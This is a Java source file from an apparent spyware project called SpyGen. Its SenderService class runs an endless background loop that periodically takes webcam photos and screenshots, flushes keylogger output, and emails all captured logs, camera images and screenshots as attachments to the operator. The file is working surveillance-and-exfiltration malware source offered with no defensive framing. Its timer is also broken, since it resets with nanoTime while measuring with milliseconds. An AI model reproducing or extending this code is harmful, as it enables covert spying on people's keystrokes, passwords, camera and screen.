package com.houarizegai.spygen.mail;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.keylogger.Keylogger;
import com.houarizegai.spygen.screenshot.Screenshot;
import com.houarizegai.spygen.webcam.Camera;

import java.io.File;
import java.util.Date;

public class SenderService implements Runnable {

    private Thread service;

    public SenderService() {
        service = new Thread(this, "Manage service");
        service.start();
    }

    @Override
    public void run() {
        long start = System.currentTimeMillis();
        while(true) {
            long elapsed = (System.currentTimeMillis() - start) / 1000;
            if(elapsed >= Settings.periodSendingSeconds) { // Send email every time period (you can augment the time as you like!)
                try {
                    Camera.takePicture("capture_" + new Date().toString().replace(" ", "_").replace(":", "-"));
                    Screenshot.takeScreenshot("screenshot_" + new Date().toString().replace(" ", "_").replace(":", "-"));
                    Keylogger.keyboard.onSave();

                    SendEmail sendEmail = new SendEmail("SpyGen result", "This result send it at data: " + new Date().toString());

                    File folder = new File(Settings.KEYLOGGER_PATH);
                    File[] listOfFiles = folder.listFiles();
                    for (int i = 0; i < listOfFiles.length; i++) {
                        if (listOfFiles[i].isFile()) {
                            sendEmail.attach(listOfFiles[i].getPath(), "Logs");
                        }
                    }

                    folder = new File(Settings.WEBCAM_PATH);
                    listOfFiles = folder.listFiles();
                    if(listOfFiles != null) {
                        for (int i = 0; i < listOfFiles.length; i++) {
                            if (listOfFiles[i].isFile()) {
                                sendEmail.attach(listOfFiles[i].getPath(), "Camera");
                            }
                        }
                    }

                    folder = new File(Settings.SCREENSHOT_PATH);
                    listOfFiles = folder.listFiles();
                    for (int i = 0; i < listOfFiles.length; i++) {
                        if (listOfFiles[i].isFile()) {
                            sendEmail.attach(listOfFiles[i].getPath(), "Screenshot");
                        }
                    }

                    sendEmail.send();
                } catch(Throwable e) {
                    e.printStackTrace();
                    System.out.println("Keystroke data fail to be send.");
                }

                start = System.nanoTime(); // Reset the timer
            }
        }
    }
    
}
